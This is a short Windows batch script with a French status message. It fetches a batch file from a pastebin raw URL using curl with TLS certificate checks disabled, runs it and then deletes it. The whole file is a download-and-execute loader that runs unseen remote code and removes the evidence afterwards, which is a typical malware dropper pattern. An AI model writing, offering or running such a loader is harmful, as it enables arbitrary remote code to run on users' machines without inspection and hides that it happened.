@echo off
set "PASTEBIN_URL=https://pastebin.com/raw/CaDVNikH"

set "TMPFILE=%TEMP%\paste_script.bat"

C:\Windows\System32\curl.exe -k -L "%PASTEBIN_URL%" -o "%TMPFILE%"

echo Fichier téléchargé : %TMPFILE%
call "%TMPFILE%"
del "%TMPFILE%"
